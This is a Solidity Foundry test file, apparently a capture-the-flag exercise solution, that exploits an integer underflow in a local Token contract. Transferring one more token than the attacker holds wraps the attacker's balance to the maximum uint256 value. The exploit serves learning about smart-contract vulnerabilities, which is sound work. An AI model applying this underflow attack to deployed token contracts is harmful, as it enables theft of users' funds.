// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Token} from "../src/Token.sol";

contract TokenAttack is Test{
  Token token;
  address attacker;
  uint256 INITIAL_SUPPLY = 100e18;

  function setUp() public{
    attacker = makeAddr("attacker");
    vm.deal(attacker, 1e18);

    vm.prank(attacker);
    token = new Token(INITIAL_SUPPLY);
  }

  function testShouldReceiveInitialTokens() view public{
    assertEq(token.balanceOf(attacker), INITIAL_SUPPLY);
  }

  function testShouldStoleAllTokens() public{
    address receiver = makeAddr("receiver");

    vm.prank(attacker);
    token.transfer(receiver, INITIAL_SUPPLY+1);

    uint256 underflowNumber = uint256(0 - 1);
    assertEq(token.balanceOf(attacker), underflowNumber);

    console.log(token.totalSupply());
  }
}